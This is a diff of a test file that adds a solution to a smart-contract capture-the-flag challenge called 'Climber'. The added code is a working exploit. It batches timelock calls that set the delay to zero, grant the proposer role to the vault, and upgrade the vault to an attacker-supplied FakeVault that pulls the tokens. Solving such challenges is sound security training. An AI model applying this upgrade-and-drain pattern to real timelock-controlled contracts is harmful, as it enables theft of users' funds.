@@ -53,6 +53,41 @@ describe("[Challenge] Climber", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const fakeVault = await (
+            await ethers.getContractFactory("FakeVault")
+        ).deploy(this.timelock.address, this.token.address, attacker.address)
+
+        const targets = []
+        const datas = []
+
+        // #1 execution updateDelay
+        const updateDelayCallData = this.timelock.interface.encodeFunctionData("updateDelay", [0])
+        targets.push(this.timelock.address)
+        datas.push(updateDelayCallData)
+
+        // #2 execution grantRole() to vault
+        const grantCallData = this.timelock.interface.encodeFunctionData("grantRole", [
+            await this.timelock.PROPOSER_ROLE(),
+            this.vault.address,
+        ])
+        targets.push(this.timelock.address)
+        datas.push(grantCallData)
+
+        // #3 execution : upgrade vault and call
+        const fvCallData = fakeVault.interface.encodeFunctionData("pull", [fakeVault.address])
+        const upgradeData = this.vault.interface.encodeFunctionData("upgradeToAndCall", [
+            fakeVault.address,
+            fvCallData,
+        ])
+        targets.push(this.vault.address)
+        datas.push(upgradeData)
+
+        await this.timelock.execute(
+            targets,
+            [0, 0, 0],
+            datas,
+            "0x0000000000000000000000000000000000000000000000000000000000000001",
+        )
     })
 
     after(async function () {
